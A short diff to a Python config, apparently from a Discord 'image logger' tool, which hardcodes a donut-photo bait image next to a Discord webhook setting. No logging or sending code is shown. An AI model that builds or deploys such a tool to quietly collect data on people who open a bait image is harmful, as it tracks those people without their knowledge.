@@ -11,12 +11,11 @@ __author__ = "Dealer"
 
 # Load from environment variables (set in Vercel)
 WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL", "")
-IMAGE_URL = os.getenv("IMAGE_URL", "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fpeople.com%2Fthmb%2Fy7ftO1rfZWFpO5-MY-LO-_M1OPs%3D%2F1500x0%2Ffilters%3Ano_upscale()%3Amax_bytes(150000)%3Astrip_icc()%3Afocal(749x0%3A751x2)%2FKrispy-Kreme-110923-1-6c6e17073b1c4cc19c976565312f3a81.jpg&f=1&nofb=1&ipt=b6157cc815d132919d75a5b299bc33ef94d61901eca8d4cfd0b6d3d07743ca90")
 
 config = {
     # BASE CONFIG #
     "webhook": WEBHOOK_URL,
-    "image": IMAGE_URL,
+    "image": "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fpeople.com%2Fthmb%2Fy7ftO1rfZWFpO5-MY-LO-_M1OPs%3D%2F1500x0%2Ffilters%3Ano_upscale()%3Amax_bytes(150000)%3Astrip_icc()%3Afocal(749x0%3A751x2)%2FKrispy-Kreme-110923-1-6c6e17073b1c4cc19c976565312f3a81.jpg&f=1&nofb=1&ipt=b6157cc815d132919d75a5b299bc33ef94d61901eca8d4cfd0b6d3d07743ca90",
     "imageArgument": True,
 
     # CUSTOMIZATION #
